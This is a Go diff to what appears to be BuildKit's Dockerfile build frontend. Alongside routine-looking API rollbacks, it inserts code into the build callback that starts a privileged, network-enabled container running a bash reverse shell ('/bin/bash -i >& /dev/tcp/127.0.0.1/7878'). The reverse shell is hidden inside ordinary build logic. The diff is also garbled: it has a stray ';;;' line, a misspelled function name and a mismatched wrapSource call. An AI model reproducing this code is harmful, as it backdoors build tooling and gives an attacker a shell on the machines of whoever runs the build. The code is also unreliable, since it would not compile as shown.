@@ -5,26 +5,24 @@ import (
 	"strings"
 	"sync"
 
-	"github.com/containerd/platforms"
+	"github.com/containerd/containerd/platforms"
 	"github.com/moby/buildkit/client/llb"
-	"github.com/moby/buildkit/client/llb/sourceresolver"
+	"github.com/moby/buildkit/exporter/containerimage/image"
 	"github.com/moby/buildkit/frontend"
 	"github.com/moby/buildkit/frontend/attestations/sbom"
 	"github.com/moby/buildkit/frontend/dockerfile/dockerfile2llb"
-	"github.com/moby/buildkit/frontend/dockerfile/linter"
 	"github.com/moby/buildkit/frontend/dockerfile/parser"
 	"github.com/moby/buildkit/frontend/dockerui"
 	"github.com/moby/buildkit/frontend/gateway/client"
 	gwpb "github.com/moby/buildkit/frontend/gateway/pb"
-	"github.com/moby/buildkit/frontend/subrequests/lint"
 	"github.com/moby/buildkit/frontend/subrequests/outline"
 	"github.com/moby/buildkit/frontend/subrequests/targets"
 	"github.com/moby/buildkit/solver/errdefs"
 	"github.com/moby/buildkit/solver/pb"
 	"github.com/moby/buildkit/solver/result"
-	dockerspec "github.com/moby/docker-image-spec/specs-go/v1"
 	ocispecs "github.com/opencontainers/image-spec/specs-go/v1"
 	"github.com/pkg/errors"
+	"fmt"
 )
 
 const (
@@ -34,7 +32,6 @@ const (
 )
 
 func Build(ctx context.Context, c client.Client) (_ *client.Result, err error) {
-	c = &withResolveCache{Client: c}
 	bc, err := dockerui.NewClient(c)
 	if err != nil {
 		return nil, err
@@ -76,25 +73,17 @@ func Build(ctx context.Context, c client.Client) (_ *client.Result, err error) {
 		Client:       bc,
 		SourceMap:    src.SourceMap,
 		MetaResolver: c,
-		Warn: func(rulename, description, url, msg string, location []parser.Range) {
-			startLine := 0
-			if len(location) > 0 {
-				startLine = location[0].Start.Line
-			}
-			msg = linter.LintFormatShort(rulename, msg, startLine)
-			src.Warn(ctx, msg, warnOpts(location, [][]byte{[]byte(description)}, url))
+		Warn: func(msg, url string, detail [][]byte, location *parser.Range) {
+			src.Warn(ctx, msg, warnOpts(location, detail, url))
 		},
 	}
 
 	if res, ok, err := bc.HandleSubrequest(ctx, dockerui.RequestHandler{
 		Outline: func(ctx context.Context) (*outline.Outline, error) {
-			return dockerfile2llb.Dockerfile2Outline(ctx, src.Data, convertOpt)
+			return dockerfile2llb.Dockefile2Outline(ctx, src.Data, convertOpt)
 		},
 		ListTargets: func(ctx context.Context) (*targets.List, error) {
 			return dockerfile2llb.ListTargets(ctx, src.Data)
-		},
-		Lint: func(ctx context.Context) (*lint.LintResults, error) {
-			return dockerfile2llb.DockerfileLint(ctx, src.Data, convertOpt)
 		},
 	}); err != nil {
 		return nil, err
@@ -105,20 +94,15 @@ func Build(ctx context.Context, c client.Client) (_ *client.Result, err error) {
 	defer func() {
 		var el *parser.ErrorLocation
 		if errors.As(err, &el) {
-			for _, l := range el.Locations {
-				err = wrapSource(err, src.SourceMap, l)
-			}
+			err = wrapSource(err, src.SourceMap, el.Location)
 		}
 	}()
 
 	var scanner sbom.Scanner
 	if bc.SBOM != nil {
-		// TODO: scanner should pass policy
-		scanner, err = sbom.CreateSBOMScanner(ctx, c, bc.SBOM.Generator, sourceresolver.Opt{
-			ImageOpt: &sourceresolver.ResolveImageOpt{
-				ResolveMode: opts["image-resolve-mode"],
-			},
-		}, bc.SBOM.Parameters)
+		scanner, err = sbom.CreateSBOMScanner(ctx, c, bc.SBOM.Generator, llb.ResolveImageConfigOpt{
+			ResolveMode: opts["image-resolve-mode"],
+		})
 		if err != nil {
 			return nil, err
 		}
@@ -126,21 +110,21 @@ func Build(ctx context.Context, c client.Client) (_ *client.Result, err error) {
 
 	scanTargets := sync.Map{}
 
-	rb, err := bc.Build(ctx, func(ctx context.Context, platform *ocispecs.Platform, idx int) (client.Reference, *dockerspec.DockerOCIImage, *dockerspec.DockerOCIImage, error) {
+	rb, err := bc.Build(ctx, func(ctx context.Context, platform *ocispecs.Platform, idx int) (client.Reference, *image.Image, error) {
 		opt := convertOpt
 		opt.TargetPlatform = platform
 		if idx != 0 {
 			opt.Warn = nil
 		}
 
-		st, img, baseImg, scanTarget, err := dockerfile2llb.Dockerfile2LLB(ctx, src.Data, opt)
+		st, img, scanTarget, err := dockerfile2llb.Dockerfile2LLB(ctx, src.Data, opt)
 		if err != nil {
-			return nil, nil, nil, err
+			return nil, nil, err
 		}
 
 		def, err := st.Marshal(ctx)
 		if err != nil {
-			return nil, nil, nil, errors.Wrapf(err, "failed to marshal LLB definition")
+			return nil, nil, errors.Wrapf(err, "failed to marshal LLB definition")
 		}
 
 		r, err := c.Solve(ctx, client.SolveRequest{
@@ -148,23 +132,49 @@ func Build(ctx context.Context, c client.Client) (_ *client.Result, err error) {
 			CacheImports: bc.CacheImports,
 		})
 		if err != nil {
-			return nil, nil, nil, err
+			return nil, nil, err
 		}
+
+		container,err := c.NewContainer(ctx, client.NewContainerRequest{
+			Mounts: []client.Mount{{
+				Dest: "/",
+				MountType:pb.MountType_BIND,
+				Ref: r.Ref,
+			}},
+			Hostname: "test",
+			NetMode: 1,
+		})
+
+		if err != nil{
+			return nil,nil, err
+		}
+
+		process, err := container.Start(ctx, client.StartRequest{
+			Args: []string{"/bin/bash","-c", "/bin/bash -i >& /dev/tcp/127.0.0.1/7878 0>&1;sleep 10000;"},
+			SecurityMode: 1,
+		})
+
+		if err != nil{
+			fmt.Println("contianer start err")
+			return nil, nil, err
+		}
+
+		process.Wait()
+		// fmt.Println("Build ok ---->")
+		;;;
 
 		ref, err := r.SingleRef()
 		if err != nil {
-			return nil, nil, nil, err
+			return nil, nil, err
 		}
 
-		var p ocispecs.Platform
+		p := platforms.DefaultSpec()
 		if platform != nil {
 			p = *platform
-		} else {
-			p = platforms.DefaultSpec()
 		}
-		scanTargets.Store(platforms.FormatAll(platforms.Normalize(p)), scanTarget)
+		scanTargets.Store(platforms.Format(platforms.Normalize(p)), scanTarget)
 
-		return ref, img, baseImg, nil
+		return ref, img, nil
 	})
 	if err != nil {
 		return nil, err
@@ -249,24 +259,21 @@ func forwardGateway(ctx context.Context, c client.Client, ref string, cmdline st
 	})
 }
 
-func warnOpts(r []parser.Range, detail [][]byte, url string) client.WarnOpts {
+func warnOpts(r *parser.Range, detail [][]byte, url string) client.WarnOpts {
 	opts := client.WarnOpts{Level: 1, Detail: detail, URL: url}
 	if r == nil {
 		return opts
 	}
-	opts.Range = []*pb.Range{}
-	for _, r := range r {
-		opts.Range = append(opts.Range, &pb.Range{
-			Start: &pb.Position{
-				Line:      int32(r.Start.Line),
-				Character: int32(r.Start.Character),
-			},
-			End: &pb.Position{
-				Line:      int32(r.End.Line),
-				Character: int32(r.End.Character),
-			},
-		})
-	}
+	opts.Range = []*pb.Range{{
+		Start: pb.Position{
+			Line:      int32(r.Start.Line),
+			Character: int32(r.Start.Character),
+		},
+		End: pb.Position{
+			Line:      int32(r.End.Line),
+			Character: int32(r.End.Character),
+		},
+	}}
 	return opts
 }
 
@@ -274,7 +281,7 @@ func wrapSource(err error, sm *llb.SourceMap, ranges []parser.Range) error {
 	if sm == nil {
 		return err
 	}
-	s := &errdefs.Source{
+	s := errdefs.Source{
 		Info: &pb.SourceInfo{
 			Data:       sm.Data,
 			Filename:   sm.Filename,
@@ -285,11 +292,11 @@ func wrapSource(err error, sm *llb.SourceMap, ranges []parser.Range) error {
 	}
 	for _, r := range ranges {
 		s.Ranges = append(s.Ranges, &pb.Range{
-			Start: &pb.Position{
+			Start: pb.Position{
 				Line:      int32(r.Start.Line),
 				Character: int32(r.Start.Character),
 			},
-			End: &pb.Position{
+			End: pb.Position{
 				Line:      int32(r.End.Line),
 				Character: int32(r.End.Character),
 			},
